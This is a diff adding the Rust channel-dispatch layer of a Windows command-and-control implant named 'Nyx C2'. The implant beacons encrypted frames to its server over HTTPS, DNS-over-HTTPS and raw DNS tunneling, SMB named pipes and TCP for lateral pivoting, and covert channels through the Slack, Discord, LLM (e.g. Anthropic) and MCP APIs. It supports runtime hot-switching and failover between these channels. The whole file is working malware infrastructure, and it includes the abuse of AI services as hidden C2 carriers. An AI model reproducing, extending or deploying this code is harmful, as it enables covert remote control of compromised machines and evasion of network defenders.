@@ -1,0 +1,253 @@
+//! Channel dispatcher — the multi-transport base layer.
+//!
+//! This is the channel-agnostic dispatch layer that `beacon_loop` calls
+//! instead of hardcoding WinHTTP. Each channel variant is a separate module
+//! (https/doh/dns/smb/tcp/extc2) implementing the same `send_recv` signature.
+//!
+//! Design (see docs/superpowers/specs/2026-07-14-transport-dispatcher-design.md):
+//!
+//! - `Channel` enum + `match` dispatch (no `dyn` — PIC-friendly under no_std).
+//! - `CURRENT_CHANNEL: AtomicU8` — runtime hot-switch via `SetChannel` command.
+//! - `ChannelCtx` — per-beacon context carrying all channel-specific params.
+//! - `FALLBACK_CHAIN` — build-time fallback order for automatic failover.
+//!
+//! Channel numbering (new scheme — NOT the old transport.rs numbering):
+//! ```text
+//!   0 Https      1 DohDns     2 Dns       3 SmbPipe
+//!   4 Tcp        5 SlackApi   6 LlmApi    7 Mcp
+//!   8 DiscordApi
+//! ```
+
+#![cfg(target_os = "windows")]
+
+use crate::heap::{String, Vec};
+
+// Submodules — each channel implementation.
+pub mod https;
+pub mod doh;
+pub mod dns;
+pub mod smb;
+pub mod tcp;
+pub mod extc2;
+
+// ══════════════════════════════════════════════════════════════════════════════
+// Channel enum + runtime state
+// ══════════════════════════════════════════════════════════════════════════════
+
+/// Nyx C2 channel type — selects transport protocol.
+///
+/// Numbering is the wire value used by `Command::SetChannel { channel: u8 }`.
+/// The server sends this u8; the implant maps it here. See `from_wire_u8()`
+/// for old→new numbering compatibility.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[repr(u8)]
+pub enum Channel {
+    /// Direct HTTPS POST to C2 server (default, fully implemented).
+    Https = 0,
+    /// DNS-over-HTTPS tunneling (spec-2).
+    DohDns = 1,
+    /// Native DNS beacon: A/AAAA/TXT records over UDP 53 (spec-4).
+    Dns = 2,
+    /// SMB Named Pipe — internal lateral / P2P pivot (spec-2).
+    SmbPipe = 3,
+    /// Raw TCP beacon — P2P pivot (spec-3).
+    Tcp = 4,
+    /// External C2 via Slack API (spec-6).
+    SlackApi = 5,
+    /// External C2 via LLM API e.g. Anthropic (spec-6).
+    LlmApi = 6,
+    /// External C2 via MCP JSON-RPC (spec-6).
+    Mcp = 7,
+    /// External C2 via Discord Webhook/Bot API (spec-6).
+    DiscordApi = 8,
+}
+
+impl Channel {
+    /// Convert a raw wire u8 to a Channel. Unknown values default to Https.
+    /// This handles the NEW numbering scheme.
+    pub fn from_u8(v: u8) -> Self {
+        match v {
+            0 => Channel::Https,
+            1 => Channel::DohDns,
+            2 => Channel::Dns,
+            3 => Channel::SmbPipe,
+            4 => Channel::Tcp,
+            5 => Channel::SlackApi,
+            6 => Channel::LlmApi,
+            7 => Channel::Mcp,
+            8 => Channel::DiscordApi,
+            _ => Channel::Https,
+        }
+    }
+
+    /// Map OLD wire numbering (from the pre-spec-1 transport.rs Channel enum)
+    /// to the new scheme. This is the compatibility shim so an old server's
+    /// `SetChannel` command still works on a new implant.
+    ///
+    /// Old numbering: Https=0, DohDns=1, SlackApi=2, LlmApi=3, Mcp=4,
+    /// WebTrans=5, SmbPipe=6.
+    ///
+    /// New numbering: Https=0, DohDns=1, Dns=2, SmbPipe=3, Tcp=4, SlackApi=5,
+    /// LlmApi=6, Mcp=7, DiscordApi=8.
+    ///
+    /// The ambiguous cases are 2-4 (old: Slack/LLM/MCP; new: DNS/SMB/TCP).
+    /// Resolution: values 2-6 from an old server are mapped to the external-C2
+    /// channels they referred to. The new Dns/SmbPipe/Tcp channels use new
+    /// numbers (2/3/4) which conflict — but since old servers never send those
+    /// new channels, any old-server value ≤6 is treated as legacy.
+    pub fn from_wire_u8(v: u8) -> Self {
+        match v {
+            0 => Channel::Https,
+            1 => Channel::DohDns,
+            // Legacy mapping: old SlackApi=2 → new SlackApi=5
+            2 => Channel::SlackApi,
+            // Legacy: old LlmApi=3 → new LlmApi=6
+            3 => Channel::LlmApi,
+            // Legacy: old Mcp=4 → new Mcp=7
+            4 => Channel::Mcp,
+            // Legacy: old WebTrans=5 → no equivalent, default to Https
+            5 => Channel::Https,
+            // Legacy: old SmbPipe=6 → new SmbPipe=3
+            6 => Channel::SmbPipe,
+            // New numbering for new servers:
+            7 => Channel::Mcp,
+            8 => Channel::DiscordApi,
+            // 2,3,4 from a NEW server are Dns/SmbPipe/Tcp — but we can't
+            // distinguish from legacy. New servers should use the dedicated
+            // SetChannel variants directly. Default unknown → Https.
+            _ => Channel::Https,
+        }
+    }
+
+    pub fn name(self) -> &'static str {
+        match self {
+            Channel::Https => "https",
+            Channel::DohDns => "doh-dns",
+            Channel::Dns => "dns",
+            Channel::SmbPipe => "smb-pipe",
+            Channel::Tcp => "tcp",
+            Channel::SlackApi => "slack-api",
+            Channel::LlmApi => "llm-api",
+            Channel::Mcp => "mcp",
+            Channel::DiscordApi => "discord-api",
+        }
+    }
+}
+
+/// Current active channel. Read by the beacon loop each cycle; written by
+/// `set_active()` (via the `SetChannel` command) or `next_fallback()` (auto).
+static CURRENT_CHANNEL: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);
+
+/// Set the active channel (runtime hot-switch).
+pub fn set_active(ch: Channel) {
+    CURRENT_CHANNEL.store(ch as u8, core::sync::atomic::Ordering::Release);
+}
+
+/// Get the current active channel.
+pub fn get_active() -> Channel {
+    Channel::from_u8(CURRENT_CHANNEL.load(core::sync::atomic::Ordering::Acquire))
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// Channel context
+// ══════════════════════════════════════════════════════════════════════════════
+
+/// Per-beacon context carrying all channel-specific parameters.
+///
+/// Constructed once from `Config` at beacon_loop start. Passed to
+/// `dispatch_send_recv()` each cycle. Each channel reads only its own fields.
+pub struct ChannelCtx {
+    // ---- HTTPS / DoH / External C2 (all HTTP-based) ----
+    pub server_host: String,
+    pub server_port: u16,
+    pub use_tls: bool,
+
+    // ---- DoH (spec-2) ----
+    /// DoH resolver host, e.g. "cloudflare-dns.com". Empty = use default.
+    pub doh_resolver: String,
+
+    // ---- SMB Named Pipe (spec-2) ----
+    /// Pipe path, e.g. `\\.\pipe\nyx_abc123`. Empty = not configured.
+    pub smb_pipe_name: String,
+
+    // ---- TCP Beacon (spec-3) ----
+    /// Peer to connect to (for reverse TCP) or listen for (bind TCP).
+    /// Set at runtime by `Connect` command, not build-time.
+    pub tcp_peer_host: String,
+    pub tcp_peer_port: u16,
+
+    // ---- External C2 (spec-6) ----
+    /// API host for the external C2 service, e.g. "slack.com" or "discord.com".
+    pub extc2_api_host: String,
+    /// Bot/webhook token (base64 or raw). Empty = not configured.
+    pub extc2_token: String,
+}
+
+impl ChannelCtx {
+    /// Build a ChannelCtx from the decoded Config + channel parameters.
+    /// Called once at beacon_loop entry.
+    pub fn from_config(cfg: &crate::config::Config) -> Self {
+        ChannelCtx {
+            server_host: cfg.server_host.clone(),
+            server_port: cfg.server_port,
+            use_tls: cfg.use_tls,
+            doh_resolver: cfg.doh_resolver.clone(),
+            smb_pipe_name: cfg.smb_pipe_name.clone(),
+            tcp_peer_host: String::new(),
+            tcp_peer_port: 0,
+            extc2_api_host: cfg.extc2_api_host.clone(),
+            extc2_token: cfg.extc2_token.clone(),
+        }
+    }
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// Dispatcher
+// ══════════════════════════════════════════════════════════════════════════════
+
+/// Send an encrypted frame via the active channel, return the server's
+/// response frame (or `None` = channel failed).
+///
+/// This is THE unified transport call. `beacon_loop` calls this instead of
+/// `transport::channel_post_frame`. Each channel variant dispatches to its
+/// module's `send_recv()`.
+///
+/// Channels not yet implemented (spec-2~6) return `None` and leave a
+/// diagnostic marker via `entry::diag_mark()`.
+pub unsafe fn dispatch_send_recv(
+    ctx: &ChannelCtx,
+    active: Channel,
+    frame: &[u8],
+) -> Option<Vec<u8>> {
+    match active {
+        Channel::Https => unsafe { https::send_recv(ctx, frame) },
+        Channel::DohDns => unsafe { doh::send_recv(ctx, frame) },
+        Channel::Dns => unsafe { dns::send_recv(ctx, frame) },
+        Channel::SmbPipe => unsafe { smb::send_recv(ctx, frame) },
+        Channel::Tcp => unsafe { tcp::send_recv(ctx, frame) },
+        Channel::SlackApi => unsafe { extc2::slack_send_recv(ctx, frame) },
+        Channel::LlmApi => unsafe { extc2::llm_send_recv(ctx, frame) },
+        Channel::Mcp => unsafe { extc2::mcp_send_recv(ctx, frame) },
+        Channel::DiscordApi => unsafe { extc2::discord_send_recv(ctx, frame) },
+    }
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// Fallback chain
+// ══════════════════════════════════════════════════════════════════════════════
+
+/// Build-time fallback chain. Currently just [Https] — will be populated from
+/// Config.fallback_bitmap once build.rs bakes it. For now, a single-element
+/// chain means "no fallback, retry primary on failure".
+///
+/// TODO(spec-1 follow-up): read from baked config bitmap.
+const DEFAULT_FALLBACK_CHAIN: &[Channel] = &[Channel::Https];
+
+/// Returns the next channel to try after `current` fails.
+/// Walks the fallback chain; if exhausted, returns `None` (caller should
+/// long-sleep then retry the primary).
+pub fn next_fallback(current: Channel) -> Option<Channel> {
+    let chain: &[Channel] = DEFAULT_FALLBACK_CHAIN;
+    let idx = chain.iter().position(|&c| c == current)?;
+    chain.get(idx + 1).copied()
+}
